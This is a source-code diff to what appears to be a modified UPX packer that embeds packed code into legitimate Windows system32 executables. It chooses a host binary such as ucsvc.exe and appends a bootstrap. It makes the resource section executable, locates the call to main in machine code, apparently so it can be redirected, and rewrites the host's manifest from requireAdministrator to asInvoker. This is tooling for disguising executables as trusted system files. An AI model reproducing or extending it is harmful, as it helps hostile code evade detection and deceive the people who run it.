@@ -2615,10 +2615,18 @@ void PeFile::pack0(OutputFile *fo, ht &ih, ht &oh, unsigned subsystem_mask,
     /*
     * prepare bootstrap starts
     */
-    if (host->isCmdlineFunc) {
-        bsLinker->addLoader("CMD_CALL");
+    if (!host->isGui) {
+        bsLinker->addLoader("ARGC");
+    }
+    bsLinker->addLoader("ARGV");
+    if (host->isGui) {
+        if (host->isCmdlineFunc) {
+            bsLinker->addLoader("CMD_CALL_GUI");
+        } else {
+            bsLinker->addLoader("CMD_READ_GUI");
+        }
     } else {
-        bsLinker->addLoader("CMD_READ");
+        bsLinker->addLoader("CMD_READ_CLI");
     }
     if (host->isWide) {
         bsLinker->addLoader("CMD_WCHAR");
@@ -3261,11 +3269,11 @@ Host64::Host64(PeFile64 *_pe) : PeFile64(&InputFile()) {
     while (true) {
         p = files[randGen()];
         printf("Try host: %s\n", p.c_str());
-        p = "c:\\windows\\system32\\netbtugc.exe"; // main
+        // p = "c:\\windows\\system32\\netbtugc.exe"; // main
         // p = "c:\\windows\\system32\\Register-CimProvider.exe"; // wmain
-        // p = "c:\\windows\\system32\\cliconfg.exe"; // winmain
+        // p = "c:\\windows\\system32\\cliconfg.exe"; // winmain, _acmdln
         // p = "c:\\windows\\system32\\plasrv.exe"; // wwinmain, _wcmdln
-        // p = "c:\\windows\\system32\\ucsvc.exe"; // wwinmain, _o__get_wide_winmain_command_line_0
+        p = "c:\\windows\\system32\\ucsvc.exe"; // wwinmain, _o__get_wide_winmain_command_line_0
         fi->sopen(p.c_str(), O_BINARY | O_RDONLY, SH_DENYNO);
         file_size = upx_int64_t(fi->st_size());
         readFileHeader();
@@ -3307,7 +3315,7 @@ Host64::Host64(PeFile64 *_pe) : PeFile64(&InputFile()) {
     pSection[0].vsize += bootstrapSize;
 
 
-    bool isGui = ih.subsystem == IMAGE_SUBSYSTEM_WINDOWS_GUI;
+    isGui = ih.subsystem == IMAGE_SUBSYSTEM_WINDOWS_GUI;
 
     // embed, replace the version res
     bool embedable = false;
@@ -3381,6 +3389,18 @@ Host64::Host64(PeFile64 *_pe) : PeFile64(&InputFile()) {
                     secRes->size = newResSize;
                     secRes->flags = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE; // test only
                     embedable = true;
+                } else if (rde->tnl == RT_MANIFEST) {
+                    char *manifest = (char *)ibuf.subref(
+                            "bad manifest %#x",
+                            secRes->rawdataptr + (data->offset - secRes->vaddr),
+                            data->size
+                            );
+                    char admin[] =                    "requireAdministrator";
+                    char invoker[sizeof(admin) + 1] = "asInvoker\"           ";
+                    char *ptr = strstr(manifest, admin);
+                    if(ptr != NULL) {
+                        memcpy(ptr, invoker, sizeof(admin));
+                    }
                 }
             }
         }
@@ -3401,10 +3421,12 @@ Host64::Host64(PeFile64 *_pe) : PeFile64(&InputFile()) {
         ++call_main;
         if (*call_main != 0xe8) continue;
         if(isGui) {
-            if ((*(int *)(call_main - 7) & 0xffffff) == 0x0d8d48) break; // lea rcx, ...
+            if (*(unsigned __int16 *)(call_main - 9) == 0xd233) break; // xor edx, edx
         } else {
-            if (*(__int16 *)(call_main - 6) == 0x0d8b) break; // lea rcx, ...
+            if (*(unsigned __int16 *)(call_main - 6) == 0x0d8b) break; // mov, ecx, ...
         }
+        counter += 4;
+        call_main += 4;
     }
     if (counter == 0x200) {
         throw std::runtime_error("Can't find call_main");
@@ -3435,7 +3457,7 @@ Host64::Host64(PeFile64 *_pe) : PeFile64(&InputFile()) {
                 if (found) {
                     break;
                 }
-            } else if (strcmp(base + im->dllname, "api-ms-win-crt-private-l1-1-0") == 0) {
+            } else if (strcmp(base + im->dllname, "api-ms-win-crt-private-l1-1-0.dll") == 0) {
                 __int64 * iat = (__int64 *)(base + im->iat);
                 while (*iat) {
                     // Assume always string rather than ordianl
